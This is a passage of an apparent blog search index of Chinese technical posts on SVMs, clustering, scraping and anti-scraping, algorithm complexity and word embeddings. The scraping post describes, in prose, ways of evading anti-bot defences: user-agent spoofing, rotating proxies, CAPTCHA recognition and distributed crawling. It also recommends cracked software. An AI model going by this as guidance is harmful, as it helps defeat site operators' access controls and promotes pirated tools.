要大许多，即训练集数据量不够支持我们训练一个复杂的非线性模型，我们选用逻辑回归模型或者不带核函数的支持向量机。（2）如果 n 较小，而且 m 大小中等，例如 n 在 1-1000 之间，而 m 在10-10000之间，使用高斯核函数的支持向量机。（3）如果 n 较小，而 m 较大，例如 n 在1-1000之间，而 m 大于50000，则使用支持向量机会非常慢，解决方案是创造、增加更多的特征，然后使用逻辑回归或不带核函数的支持向量机。 值得一提的是，神经网络在以上三种情况下都可能会有较好的表现，但是训练神经网络可能非常慢，选择支持向量机的原因主要在于它的代价函数是凸函数，不存在局部最小值。 但是通常更加重要的是：你有多少数据，你有多熟练是否擅长做误差分析和排除学习算法，指出如何设定新的特征变量和找出其他能决定你学习算法的变量等方面，这些方面会比你使用 SVM，LR 还是神经网络更加重要。 支持向量机通俗导论（理解SVM的三层境界）在线阅读链接：http://blog.csdn.net/v_july_v/article/details/7624837网盘下载地址：https://pan.baidu.com/s/1htfvbzI 密码：qian建议下载网盘里的pdf阅读，文档附带完整书签。 常用核函数及核函数的条件推荐一篇文章： svm核函数的理解和选择 带核的SVM为什么能分类非线性问题核函数的本质是两个函数的內积，通过核函数，SVM将低维数据隐射到高维空间，在高维空间，非线性问题转化为线性问题，详见 核函数。","link":"/2017/10/22/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9ASVM/"},{"title":"机器学习（四）：聚类算法","text":"持续更新中。。。 示例代码 思维导图 聚类简介 kmeans Mini Batch K-Means 二分KMeans算法 Kmeans++ 层次聚类 密度聚类 谱聚类 聚类简介聚类就是对大量未知标注的数据集，按照数据 内部存在的数据特征 将数据集划分为 多个不同的类别，使 类别内的数据比较相似，类别之间的数据相似度比较小； 聚类算法的重点是计算样本项之间的相似度，有时候也称为样本间的距离。 聚类属于无监督学习，和分类算法的区别：（1）分类算法是有监督学习，基于有标注的历史数据进行算法模型构建（2）聚类算法是无监督学习，数据集中的数据是没有标注的 聚类算法的衡量指标: 混淆矩阵 均一性 完整性 V-measure 调整兰德系数(ARI) 调整互信息(AMI) 轮廓系数(Silhouette) kmeansK-means算法，也称为K-平均或者K-均值，是一种使用广泛的最基础的聚类算法，一般作为接触聚类算法的第一个算法。 假设输入样本为 T=X1, X2, …, Xm; 则 算法步骤为（使用欧几里得距离公式）：（1）随机初始化 k 个类别中心 a1, a2,…ak;（2）对于每个样本 Xi，将其标记为距离类别中心 aj 最近的类别 j（3）更新每个类别的中心点 aj 为隶属该类别的所有样本的均值（4）重复上面两步操作，直到达到某个中止条件 中止条件：迭代次数、最小平方误差MSE、簇中心点变化率 K-means算法在迭代的过程中使用所有点的均值作为新的质点(中心点)，如果簇中存在异常点，将导致均值偏差比较严重。K-means算法是初值敏感的，选择不同的初始值可能导致不同的簇划分规则。 缺点： K值是用户给定的，在进行数据处理前，K值是未知的，不同的K值得到的结果也不一样； 对初始簇中心点是敏感的 不适合发现非凸形状的簇或者大小差别较大的簇 特殊值(离群值)对模型的影响比较大 优点： 理解容易，聚类效果不错 处理大数据集的时候，该算法可以保证较好的伸缩性和高效率 当簇近似高斯分布的时候，效果非常不错 Mini Batch K-Means当需要聚类的数据量非常大的时候，效率是最重要的诉求。 Mini Batch K-Means算法是K-Means算法的一种优化变种，采用小规模的数据子集(每次训练使用的数据集是在训练算法的时候随机抽取的数据子集)减少计算时间，同时试图优化目标函数；Mini Batch K-Means算法可以减少K-Means算法的收敛时间，而且产生的结果效果只是略差于标准K-Means算法。 算法步骤如下： 首先 抽取部分数据集，使用K-Means算法构建出K个聚簇点的模型 继续抽取训练数据集中的部分数据集样本数据，并将其添加到模型中，分配给距离最近的聚簇中心点 更新聚簇的中心点值 循环迭代第二步和第三步操作，直到中心点稳定或者达到迭代次数，停止计算操作 二分KMeans算法解决K-Means算法对初始簇心比较敏感的问题，二分K-Means算法是一种弱化初始质心的一种算法。 具体思路步骤如下： 将所有样本数据作为一个簇放到一个队列中 从队列中选择一个簇进行K-means算法划分，划分为两个子簇，并将子簇添加到队列中 循环迭代第二步操作，直到中止条件达到(聚簇数量、最小平方误差、迭代次数等) 队列中的簇就是最终的分类簇集合 从队列中 选择划分聚簇 的规则一般有两种方式； 对所有簇计算误差和SSE(SSE也可以认为是距离函数的一种变种)，选择SSE最大的聚簇进行划分操作(优选这种策略) 选择样本数据量最多的簇进行划分操作 由于计算量大，二分KMeans优化算法使用的比较少 Kmeans++解决K-Means算法对初始簇心比较敏感的问题，使用非常广泛。 K-Means++算法和K-Means算法的区别主要在于K的选择上。K-Means算法使用随机给定的方式。K-means++的思想则是：初始的聚类中心之间的相互距离要尽可能的远。 主要步骤如下： 从输入的数据点集合中 随机选择一个点作为第一个聚类中心 对于数据集中的每一个点x，计算它与最近聚类中心(指已选择的聚类中心)的距离D(x) 选择一个新的数据点作为新的聚类中心，选择的原则是：D(x)较大的点，被选取作为聚类中心的概率较大 重复2和3直到k个聚类中心被选出来 利用这k个初始的聚类中心来运行标准的k-means算法 从上面的算法描述上可以看到，算法的关键是第3步，如何将D(x)反映到点被选择的概率上，一种算法如下(详见此地)： 先从我们的数据库随机挑个随机点当“种子点” 对于每个点，我们都计算其和最近的一个“种子点”的距离D(x)并保存在一个数组里，然后把这些距离加起来得到Sum(D(x))。 然后，再取一个随机值，用权重的方式来取计算下一个“种子点”。这个算法的实现是，先取一个能落在Sum(D(x))中的随机值Random，然后用Random -= D(x)，直到其&lt;=0，此时的点就是下一个“种子点”。 重复2和3直到k个聚类中心被选出来 利用这k个初始的聚类中心来运行标准的k-means算法 可以看到算法的第三步选取新中心的方法，这样就能保证距离D(x)较大的点，会被选出来作为聚类中心了。至于为什么原因很简单，如下图 所示： 假设A、B、C、D的D(x)如上图所示，当算法取值Sum(D(x))*random时，该值会以较大的概率落入D(x)较大的区间内，所以对应的点会以较大的概率被选中作为新的聚类中心。 缺点：由于聚类中心点选择过程中的内在有序性，在扩展方面存在着性能方面的问题(第k个聚类中心点的选择依赖前k-1个聚类中心点的值) 层次聚类 Hierarchical Clusteringk-means聚类算法的一个变体，主要是为了改进k-means算法随机选择初始质心的随机性造成聚类结果不确定性的问题。 层次聚类算法主要分为两大类算法： 凝聚的层次聚类：AGNES 算法(AGglomerative NESting)==&gt;采用 自底向上 的策略。最初将每个对象作为一个簇，然后这些簇根据某些准则被一步一步合并，两个簇间的距离可以由这两个不同簇中距离最近的数据点的相似度来确定；聚类的合并过程反复进行直到所有的对象满足簇数目。 分裂的层次聚类：DIANA 算法(DIvisive ANALysis)==&gt;采用 自顶向下 的策略。首先将所有对象置于一个簇中，然后按照某种既定的规则逐渐细分为越来越小的簇(比如最大的欧式距离)，直到达到某个终结条件(簇数目或者簇距离达到阈值)。 优缺点 简单，理解容易 合并点/分裂点选择不太容易 合并/分类的操作不能进行撤销 大数据集不太适合 执行效率较低O(t*n 2 )，t为迭代次数，n为样本点数 密度聚类解决K-Means算法只能发现凸聚类的缺点。 密度聚类可以发现任意形状的聚类，而且对噪声数据不敏感。但是计算复杂度高，计算量大。常用算法为 DBSCAN 和 密度最大值算法。","link":"/2017/10/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9A%E8%81%9A%E7%B1%BB%E7%AE%97%E6%B3%95/"},{"title":"爬虫、反爬虫、反反爬虫","text":"最近爬取了百万数据，以下是学习爬虫时汇总的相关知识点 什么是爬虫和反爬虫 爬虫 —— 使用任何技术手段批量获取网站信息的一种方式，关键在批量。 反爬虫 —— 使用任何技术手段，阻止别人批量获取自己网站信息的一种方式。关键也在于批量。 误伤 —— 在反爬虫的过程中，错误的将普通用户识别为爬虫。误伤率高的反爬虫策略，效果再好也不能用。 拦截 —— 成功地阻止爬虫访问。通常来说，拦截率越高的策略，误伤率就越高，因此要做权衡。 资源 —— 机器成本与人力成本的总和。 反什么样的爬虫 应届毕业生(三月份爬虫)三月份爬虫通常和毕业生(本科生、硕士、博士等)有关，他们的爬虫简单粗暴，为了让论文有数据支撑，根本不管服务器压力，加上人数不可预测，很容易弄挂站点。 创业小公司每年新增的创业公司很多，程序开发完后，缺少数据支撑，出于公司生死存亡的考虑，不断爬取数据。 不小心写错了没人去停止的失控小爬虫像知乎，携程，财经等网站，可能高达60%的访问量是爬虫。你就算直接封杀，也无济于事。他们可能根本爬不到任何数据了，除了http code是200以外，一切都是不对的，但由于托管后无人认领，仍然会依然孜孜不倦地爬取。 成型的商业对手这是最大的对手，有技术，有钱，要什么有什么，如果和你死磕，你就只能硬着头皮和他死磕。 抽风的搜索引擎搜索引擎也有抽风的时候，而且一抽风就会导致服务器性能下降，请求量跟网络攻击没有区别。 常见的爬虫、反爬虫手段 爬虫 反爬虫 对某个网站或者APP的数据感兴趣。 [1] 首先分析网站/APP [2]的请求与返回数据，然后用python，或Java，或网上免费的抓取软件，不断遍历某列表抓取数据存数据库。 zabbix等监控显示某时间段请求陡增，ip相同，useragent还是JavaClient，直接Nginx封杀这个ip useragent模仿谷歌或者百度浏览器，再获取十几个代理ip，爬的过程中不断轮询替换ip 发现ip不断变化，直接每次请求添加用户是否登录的校验 通过注册等各种方法，获取一个真实账号，模拟登录，每次请求携带登录产生的cookie或者token。 健全账号权限体系，即拥有A的账号，无法获取账号B的数据访问权限。 设置定时器，简单粗暴的直接爬取所有能爬取的数据 针对多IP的高频访问，Nginx设置频率限制，如某个ip短时间访问超过一定次数就直接屏蔽，一定程度增加爬虫方获取有效IP的成本 写代码爬取ip代理网站，或者批量购买高匿代理ip，几千IP轮询爬 在访问频率上继续做文章，升级ip限制策略，加大ip限制的成功率。 [3] ip大量被封，为了解决这问题，开始模拟人类请求特征，比如每半小时爬取改为随机1-3秒爬一次，爬10次休息10秒，每天只在8-12，18-0点爬，隔几天还休息一下。再比如为了减少请求，能只抓列表页就不抓详情页 此刻再在访问频率上做限制，可能会误伤真实用户。如果网站类型不太注重用户体验，可以访问一定次数强制弹框要求输入验证码。 [4] 简单的验证码，完全可以自学图像识别的教程（关键词PIL，tesseract），对验证码进行二值化预处理，分割，模式训练后，识别验证码。[5] 针对具有用户行为的爬虫，首先要明白，爬虫与人类在访问特征上最大的不一样在于，人不会长时间持续访问一个网站，而爬虫的访问数量会随着时间增长而线性增长[6]。根据这特征，分析请求日志，设置ip黑名单。 由于各种限制，单个爬虫轮询ip模拟用户行为进行爬取，效率已经大大降低。这个时候有条件，可以考虑分布式，跨省跨机房，利用ADSL进行长期爬取。 既然无法避免被爬，那就继续加大对方爬取成本。[7] 如果死磕到底。。 只能硬着头皮和他继续死磕，直到一方因为机器成本与人力成本问题放弃。 &lt;/br&gt; [1] 爬取的前提是知道网站/APP的存在，如果系统不对外开放，你可能连它的存在都不知道。 [2] APP的请求可以用Fiddler抓取，具体操作见文尾的相关链接。一些APP的爬取相对Web难度较高，文本可能进行了压缩和加密，甚至为了节省用户流量，部分请求不走后端，Fiddler自然抓取不到。 [3] 拦截率越高的策略，误伤率就越高，甚至影响搜索引擎的收录。如果网站包含不希望被搜索引擎收录的内容，可以在站点部署 robots 文件。 [4] 知乎就不太可能为了反扒强制要求输入验证码，而CSDN的文件一旦下载次数过多，就会强制输入验证码。 [5] 关于验证码的识别与反识别也是一部恢弘壮丽的斗争史，目前的人机识别验证就是比较有效的反爬手段。数字验证码识别详见: 爬虫的坎坷之路-数字验证码识别 [6] 关于人类访问特征的介绍，详见: 当爬虫不遵守 robots 协议时，有没有防止抓取的可能？ [7] 反爬虫的关键在于阻止被批量爬取，重点在批量。反爬虫技术的核心在于不断变更规则，比如不断变更验证码。我们在内容上可以做如下文章： 网站不同地方的文本内容添加不同的自带标签，增加对方数据清理难度。 关键数据由文本转图片，甚至添加水印等。目前市场上图片ocr识别无法有效转文字，让对方即使获取了图片也无法有效使用。 网站相关页面的列表查询，限制总页数的展示。比如数据一共1K页，相关接口却只对外展示前十页。对方找不到入口最多爬取10页数据。 间接关闭网站核心数据查看入口，比如内容的查看像百度文库一样改为word、pdf或者ppt下载模式，高频下载需要验证码或者账号积分。 网站不提供注册入口，或者注册需要内部推荐或者评审，加大爬虫方获取账号的难度。 网站的请求url复杂化，比如弄的像淘宝一样没有规律，id改为UUID等。 前端页面尽可能不暴露数据的唯一键，对唯一键如主键id等进行伪装，可以增加对方爬取后的去重成本。因为对方爬数据可能是在你的多个模块页面进行多维度爬取，会有大量的重复数据。 前端html页面别一次性加载列表，根据用户点击js动态加载。即查询页面源码时，只能看到列表的第一条数据。 当确定访问异常时，大量返回虚假数据。爬虫几乎没有判断数据真假的能力，只有人才有。对方发现的越晚，我们的处理应对时间就越充裕。 核心数据提高安全等级，单独加密等。…. 疑问相关1、爬虫是否涉嫌违法？ 如果是的话，怎么要求赔偿？爬取的内容商业使用目前更倾向属于违法行为，但是在国内还是个擦边球，难以起诉成功。如果不想被批量爬取，技术才是最后保障。 2、在爬虫与反爬虫的对弈中，谁会胜利？爬虫与反爬虫的重点都在于批量，没有绝对的胜利方。但是可以确定的是，只要人类能够正常访问的网页，爬虫在具备同等资源的情况下一定是可以抓取到，只是能否短时间内大批量爬取的问题。 3、怎么快速爬取数据？首先考虑的是用网上各种破解版爬虫软件爬取数据，比如火车头采集器。即能用软件解决的爬取步骤，就没必要写代码实现，因为程序员比软件和服务器等资源金贵。其次考虑的才应该是如何用代码解决软件实现不了的步骤。 4、为什么需要反爬虫？ 公司的重要资源被批量爬取，丧失竞争力。 爬虫占总PV比例太高，因为高访问量浪费了太多钱。 爬虫拖垮了站点，严重影响了用户体验。 资源被爬取难以起诉成功，对方可以肆意爬取。 链接相关 有哪些网站用爬虫能爬到很有价值的数据？https://www.zhihu.com/question/36132174 利用爬虫技术能做到哪些很酷很有趣很有用的事情？https://www.zhihu.com/question/27621722 python爬虫源码集锦https://github.com/facert/awesome-spider 《我用爬虫一天时间“偷了”知乎一百万用户，只为证明PHP是世界上最好的语言》文章链接：http://developer.51cto.com/art/201509/491336.htm开发者文档：https://doc.phpspider.org/Github地址：https://github.com/owner888/phpspider heritrix3 Java爬虫框架https://github.com/internetarchive/heritrix3 验证码对抗之路及现有验证机制介绍https://yq.aliyun.com/articles/57807?spm=5176.100240.searchblog.21.OuIr47 12306 售票网站新版验证码识别对抗https://segmentfault.com/a/1190000002606801 18款Java开源Web爬虫【Heritrix等】https://www.oschina.net/news/77402/19-java-open-source-web-crawler 突破反爬虫的利器——开源IP代理池【附源码】https://zhuanlan.zhihu.com/p/23928595 fiddler对浏览器、app抓包及证书安装http://blog.csdn.net/u011608531/article/details/50838227 火车头采集器帮助文档http://www.locoy.com/index/guide","link":"/2016/12/21/%E7%88%AC%E8%99%AB%E3%80%81%E5%8F%8D%E7%88%AC%E8%99%AB%E3%80%81%E5%8F%8D%E5%8F%8D%E7%88%AC%E8%99%AB/"},{"title":"算法复杂度分析","text":"前言通常，对于一个给定的算法，我们要做两项分析。第一是从数学上证明算法的正确性，这一步主要用到形式化证明的方法及相关推理模式，如循环不变式、数学归纳法等。而在证明算法是正确的基础上，第二就是分析算法的时间复杂度。算法的时间复杂度反映了程序执行时间随输入规模增长而增长的量级，在很大程度上能很好反映出算法的优劣与否。因此，作为程序员，掌握基本的算法时间复杂度分析方法是很有必要的。 但是很多朋友并不能清晰的理解这一概念，究其原因，主要是因为没有从数学层面上理解其本质，而是习惯于从直观理解。下面，我们就一步步走近算法时间复杂度的数学本质。 算法时间复杂度的数学意义从数学上定义，给定算法A，如果存在函数F(n)，当n=k时，F(k)表示算法A在输入规模为k的情况下的运行时间，则称F(n)为算法A的时间复杂度。 另一种定义：一般情况下，算法中基本操作重复执行的次数是问题规模n的某个函数，用T(n)表示，若有某个辅助函数f(n)，使得当n趋近于无穷大时，T(n)/f(n)的极限值为不等于零的常数，则称f(n)是T(n)的同数量级函数。记作T(n)=O(f(n))，称O(f(n))为算法的渐进时间复杂度(O是数量级的符号 )，简称时间复杂度。 这里我们首先要明确输入规模的概念。关于输入规模，不是很好下定义，非严格的讲，输入规模是指算法A所接受输入的自然独立体的大小。例如，对于排序算法来说，输入规模一般就是待排序元素的个数，而对于求两个同型方阵乘积的算法，输入规模可以看作是单个方阵的维数。为了简单起见，在下面的讨论中，我们总是假设算法的输入规模是用大于零的整数表示的，即n=1,2,3,……,k,…… 我们还知道，对于同一个算法，每次执行的时间不仅取决于输入规模，还取决于输入的特性和具体的硬件环境在某次执行时的状态。所以想要得到一个统一精确的F(n)是不可能的。为了解决这个问题，我们做一下两个说明：1.忽略硬件及环境因素，假设每次执行时硬件条件和环境条件是完全一致的。2.对于输入特性的差异，我们将从数学上进行精确分析并带入函数解析式。 算法时间复杂度分析示例为了便于朋友们理解，我将不会采用教科书上惯用的快速排序、合并排序等经典示例进行分析，而是使用一个十分简单的算法作为示例。我们先来定义问题。 问题定义：输入——此问题输入为一个有序序列，其元素个数为n，n为大于零的整数。序列中的元素为从1到n这n个整数，但其顺序为完全随机。输出——元素n所在的位置。（第一个元素位置为1） 这个问题非常简单，下面直接给出其解决算法之一（伪代码）：12345678LocationN(A){ for(int i=1;i&lt;=n;i++)-----------------------t1 { if(A[i] == n) ----------------------------t2 { return i; }------------------------t3 }} 我们来看看这个算法。其中t1、t2和t3分别表示此行代码执行一次需要的时间。 首先，输入规模n是影响算法执行时间的因素之一。在n固定的情况下，不同的输入序列也会影响其执行时间。最好情况下，n就排在序列的第一个位置，那么此时的运行时间为“t1+t2+t3”。最坏情况下，n排在序列最后一位，则运行时间为“nt1+nt2+t3=(t1+t2)*n+t3”。可以看到，最好情况下运行时间是一个常数，而最坏情况下运行时间是输入规模的线性函数。那么，平均情况如何呢？ 问题定义说输入序列完全随机，即n出现在1…n这n个位置上是等可能的，即概率均为1/n。而平均情况下的执行次数即为执行次数的数学期望，其解为：12345E= p(n=1)*1+p(n=2)*2+...+p(n=n)*n= (1/n)*(1+2+...+n)= (1/n)*((n/2)*(1+n))= (n+1)/2 即在平均情况下for循环要执行(n+1)/2次，则平均运行时间为“(t1+t2)(n+1)/2+t3”。由此我们得出分析结论：**t1+t2+t3 &lt;= F(n) &lt;= (t1+t2)n+t3，在平均情况下F(n) = (t1+t2)(n+1)/2+t3* 算法的渐近时间复杂度以上分析，我们对算法的时间复杂度F(n)进行了精确分析。但是，很多时候，我们不需要进行如此精确的分析，原因有下：1.在较复杂的算法中，进行精确分析是非常复杂的。2.实际上，大多数时候我们并不关心F(n)的精确度量，而只是关心其量级。 基于此，提出渐近时间复杂度的概念。在正式给出渐近时间复杂度之前，要先给出几个数学定义：123定义一：Θ(g(n))={f(n) | 如果存在正常数c1、c2和正整数n0，使得当n&gt;=n0时，0&lt;c1g(n)&lt;=f(n)&lt;=c2g(n)恒成立}定义二：Ο(g(n))={f(n) | 如果存在正常数c和正整数n0，使得当n&gt;=n0时，0&lt;=f(n)&lt;=cg(n)恒成立}定义三：Ω(g(n))={f(n) | 如果存在正常数c和正整数n0，使得当n&gt;=n0时，0&lt;=cg(n)&lt;=f(n)恒成立} 可以看到，三个定义其实都定义了一个函数集合，只不过集合中的函数需要满足的条件不同。有了以上定义，就可以定义渐近时间复杂度了。 不过这里还有个问题：F(n)不是确定的，他是在一个范围内变动的，那么我们关心哪个F(n)呢？一般我们在分析算法时，使用最坏情况下的F(n)来评价算法效率，原因有如下两点：1.如果知道了最坏情况，我们就可以保证算法在任何时候都不能比这个情况更坏了。2.很多时候，算法运行发生最坏情况的概率还是很大的，如查找问题中待查元素不存在的情况。且在很多时候，平均情况的渐近时间复杂度和最坏情况的渐近时间复杂度是一个量级的。 于是给出如下定义：设F(n)为算法A在最坏情况下F(n)，则如果F(n)属于Θ(g(n))，则说算法A的渐近时间复杂度为g(n)，且g(n)为F(n)的渐近确界。 还是以上面的例子为例，则在上面定义中F(n) = (t1+t2)*n+t3。则F(n)的渐近确界为n，其证明如下：1234567证明：设c1=t1+t2，c2=t1+t2+t3，n0=2又因为 t1,t2,t3均大于0则，当n&gt;n0时，0&lt;c1n&lt;=F(n)&lt;=c2n 即 0&lt;(t1+t2)*n&lt;=(t1+t2)*n+t3&lt;=(t1+t2+t3)*n恒成立。所以 F(n)属于Θ(n)所以 n是F(n)的渐近确界证毕 在实际应用中，我们一般都是使用渐近时间复杂度代替实际时间复杂度来进行算法效率分析。一般认为，一个渐近复杂度为n的算法要优于渐近复杂度为n^2的算法。 注意，这并不是说渐近复杂度为n的算法在任何情况下都一定更高效，而是说在输入规模足够大后（大于临界条件n0），则前一个算法的最坏情况总是好于后一个算法的最坏情况。事实证明，在实践中这种分析是合理且有效的。 类似的，还可以给出算法时间复杂度的上确界和下确界 ：12设F(n)为算法A在最坏情况下F(n)，则如果F(n)属于Ο(g(n))，则说算法A的渐近时间复杂度上限为g(n)，且g(n)为F(n)的渐近上确界。设F(n)为算法A在最坏情况下F(n)，则如果F(n)属于Ω(g(n))，则说算法A的渐近时间复杂度下限为g(n)，且g(n)为F(n)的渐近下确界。这里一定要注意，由于我们是以F(n)最坏情况分析的，所以，我们可以100%保证在输入规模超过临界条件n0时，算法的运行时间一定不会高于渐近上确界，但是并不能100%保证算法运行时间不会低于渐近下确界，而只能100%保证算法的最坏运行时间不会低于渐近下确界。 相关链接算法的时间复杂度和空间复杂度总结：http://blog.csdn.net/zolalad/article/details/11848739","link":"/2016/07/27/%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90/"},{"title":"薛兆丰的北大经济学课","text":"最近订阅了一年的薛兆丰的北大经济学课程，全年模块如下，随着学习深入，会逐渐补上相关课程的学习心得。图谱访问地址：https://www.processon.com/view/link/58b25351e4b042deea13d552","link":"/2017/02/24/%E8%96%9B%E5%85%86%E4%B8%B0%E7%9A%84%E5%8C%97%E5%A4%A7%E7%BB%8F%E6%B5%8E%E5%AD%A6%E8%AF%BE/"},{"title":"运维那些事儿","text":"最近工作除了功能开发，还涉及数据库及系统监控。既然工作和运维有关，那有必要对运维有个基本的认识。内容持续更新中，访问地址：https://www.processon.com/view/link/58832d28e4b087b1163149ab","link":"/2016/09/17/%E8%BF%90%E7%BB%B4%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/"},{"title":"大数据学习思维导图","text":"最近一个月，会进行大数据进阶之旅。随着学习深入，会将新写的文章链接汇入图谱相关知识点中。脑图持续更新，访问地址：https://www.processon.com/view/link/58a81160e4b0669d9957a433","link":"/2017/02/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"},{"title":"自然语言处理与词嵌入","text":"词嵌入one-hot 向量将每个单词表示为完全独立的个体，不同词向量都是正交的，因此单词间的相似度无法体现。 换用特征化表示方法能够解决这一问题。我们可以通过用语义特征作为维度来表示一个词，因此语义相近的词，其词向量也相近。 将高维的词嵌入“嵌入”到一个二维空间里，就可以进行可视化。常用的一种可视化算法是 t-SNE 算法。在通过复杂而非线性的方法映射到二维空间后，每个词会根据语义和相关程度聚在一起。相关论文：van der Maaten and Hinton., 2008. Visualizing Data using t-SNE 词嵌入（Word Embedding）是 NLP 中语言模型与表征学习技术的统称，概念上而言，它是指把一个维数为所有词的数量的高维空间（one-hot 形式表示的词）“嵌入”到一个维数低得多的连续向量空间中，每个单词或词组被映射为实数域上的向量。对大量词汇进行词嵌入后获得的词向量，可用于完成 命名实体识别（Named Entity Recognition） 等任务。 词嵌入与迁移学习用词嵌入做迁移学习可以降低学习成本，提高效率。其步骤如下： 从大量的文本集中学习词嵌入，或者下载网上开源的、预训练好的词嵌入模型； 将这些词嵌入模型迁移到新的、只有少量标注训练集的任务中； 可以选择是否微调词嵌入。当标记数据集不是很大时可以省下这一步。 词嵌入与类比推理词嵌入可用于类比推理。例如，给定对应关系“男性（Man）”对“女性（Woman）”，想要类比出“国王（King）”对应的词汇。则可以有 $e{man} - e{woman} \\approx e{king} - e? $ ，之后的目标就是找到词向量 w，来找到使相似度 $sim(ew, e{king} - e{man} + e{woman})$ 最大。 一个最常用的相似度计算函数是 余弦相似度（cosine similarity）。公式为： sim(u, v) = \\frac{u^T v}{|| u ||_2 || v ||_2}相关论文：Mikolov et. al., 2013, Linguistic regularities in continuous space word representations 嵌入矩阵 不同的词嵌入方法能够用不同的方式学习到一个嵌入矩阵（Embedding Matrix） E。将字典中位置为 i 的词的 one-hot 向量表示为 $o_i$，词嵌入后生成的词向量用 $e_i$ 表示，则有： E \\cdot o_i = e_i但在实际情况下一般不这么做。因为 one-hot 向量维度很高，且几乎所有元素都是 0，这样做的效率太低。因此，实践中直接用专门的函数查找矩阵 E 的特定列。 学习词嵌入神经概率语言模型神经概率语言模型（Neural Probabilistic Language Model） 构建了一个能够通过上下文来预测未知词的神经网络，在训练这个语言模型的同时学习词嵌入。 训练过程中，将语料库中的某些词作为目标词，以目标词的部分上下文作为输入，Softmax 输出的预测结果为目标词。嵌入矩阵 E 和 w、b 为需要通过训练得到的参数。这样，在得到嵌入矩阵后，就可以得到词嵌入后生成的词向量。 相关论文：Bengio et. al., 2003, A neural probabilistic language model Word2VecWord2Vec 是一种简单高效的词嵌入学习算法，包括 2 种模型： Skip-gram (SG)：根据词预测目标上下文 Continuous Bag of Words (CBOW)：根据上下文预测目标词 每种语言模型又包含负采样（Negative Sampling）和分级的 Softmax（Hierarchical Softmax）两种训练方法。 相关论文：Mikolov et. al., 2013. Efficient estimation of word representations in vector space. Skip-gramSkip-Gram 设某个词为 c，该词的一定词距内选取一些配对的目标上下文 t，则该网路仅有的一个 Softmax 单元输出条件概率： p(t|c) = \\frac{exp(\\theta_t^T e_c)}{\\sum^m_{j=1}exp(\\theta_j^T e_c)}$θ_t$ 是一个与输出 t 有关的参数，其中省略了用以纠正偏差的参数。损失函数仍选用交叉熵： L(\\hat y, y) = -\\sum^m_{i=1}y_ilog\\hat y_i在此 Softmax 分类中，每次计算条件概率时，需要对词典中所有词做求和操作，因此计算量很大。解决方案之一是使用一个分级的 Softmax 分类器（Hierarchical Softmax Classifier），形如二叉树。在实践中，一般采用霍夫曼树（Huffman Tree）而非平衡二叉树，常用词在顶部。 如果在语料库中随机均匀采样得到选定的词 c，则 ‘the’, ‘of’, ‘a’, ‘and’ 等出现频繁的词将影响到训练结果。因此，采用了一些策略来平衡选择。 CBOW CBOW 模型的工作方式与 Skip-gram 相反，通过采样上下文中的词来预测中间的词。 吴恩达老师没有深入去讲 CBOW。想要更深入了解的话，推荐资料 word2vec原理推导与代码分析-码农场（中文）以及 课程 cs224n 的 notes1（英文）。 负采样为了解决 Softmax 计算较慢的问题，Word2Vec 的作者后续提出了 负采样（Negative Sampling）模型。对于监督学习问题中的分类任务，在训练时同时需要正例和负例。在分级的 Softmax 中，负例放在二叉树的根节点上；而对于负采样，负例是随机采样得到的。 如上图所示，当输入的词为一对上下文-目标词时，标签设置为 1（这里的上下文也是一个词）。另外任意取 k 对非上下文-目标词作为负样本，标签设置为 0。对于小数据集，k 取 5~20 较为合适；而当有大量数据时，k 可以取 2~5。 改用多个 Sigmoid 输出上下文-目标词（c, t）为正样本的概率： P(y=1 | c, t) = \\sigma(\\theta_t^Te_c)其中，$\\theta_t$、$e_c$ 分别代表目标词和上下文的词向量。 之前训练中每次要更新 n 维的多分类 Softmax 单元（n 为词典中词的数量）。现在每次只需要更新 k+1 维的二分类 Sigmoid 单元，计算量大大降低。 关于计算选择某个词作为负样本的概率，作者推荐采用以下公式（而非经验频率或均匀分布）： p(w_i) = \\frac{f(w_i)^{\\frac{3}{4}}}{\\sum^m_{j=0}f(w_j)^{\\frac{3}{4}}}其中，$f(w_i)$ 代表语料库中单词 wi 出现的频率。上述公式更加平滑，能够增加低频词的选取可能。 相关论文：Mikolov et. al., 2013. Distributed representation of words and phrases and their compositionality GloveGloVe（Global Vectors）是另一种流行的词嵌入算法。Glove 模型基于语料库统计了词的 共现矩阵 X，X中的元素 $X_{ij}$ 表示单词 i 和单词 j “为上下文-目标词”的次数。之后，用梯度下降法最小化以下损失函数： J = \\sum^N_{i=1}\\sum^N_{j=1}f(X_{ij})(\\theta^t_ie_j + b_i + b_j - log(X_{ij}))^2其中，$θi$、$e_j$ 是单词 i 和单词 j 的词向量；$b_i$、$b_j$；$f()$ 是一个用来避免 $X{ij}=0$ 时 $log(X{ij})$ 为负无穷大、并在其他情况下调整权重的函数。$X{ij}=0$ 时，$f(X_{ij}) = 0$。 “为上下文-目标词”可以代表两个词出现在同一个窗口。在这种情况下，$θ_i$ 和 $e_j$ 是完全对称的。因此，在训练时可以一致地初始化二者，使用梯度下降法处理完以后取平均值作为二者共同的值。 相关论文：Pennington st. al., 2014. Glove: Global Vectors for Word Representation 最后，使用各种词嵌入算法学到的词向量实际上大多都超出了人类的理解范围，难以从某个值中看出与语义的相关程度。 情感分类情感分类是指分析一段文本对某个对象的情感是正面的还是负面的，实际应用包括舆情分析、民意调查、产品意见调查等等。情感分类的问题之一是标记好的训练数据不足。但是有了词嵌入得到的词向量，中等规模的标记训练数据也能构建出一个效果不错的情感分类器。 如上图所示，用词嵌入方法获得嵌入矩阵 E 后，计算出句中每个单词的词向量并取平均值，输入一个 Softmax 单元，输出预测结果。这种方法的优点是适用于任何长度的文本；缺点是没有考虑词的顺序，对于包含了多个正面评价词的负面评价，很容易预测到错误结果。 使用 RNN 能够实现一个效果更好的情感分类器： 词嵌入除偏语料库中可能存在性别歧视、种族歧视、性取向歧视等非预期形式偏见（Bias），这种偏见会直接反映到通过词嵌入获得的词向量。例如，使用未除偏的词嵌入结果进行类比推理时，”Man” 对 “Computer Programmer” 可能得到 “Woman” 对 “Housemaker” 等带有性别偏见的结果。词嵌入除偏的方法有以下几种： 1. 中和本身与性别无关词汇 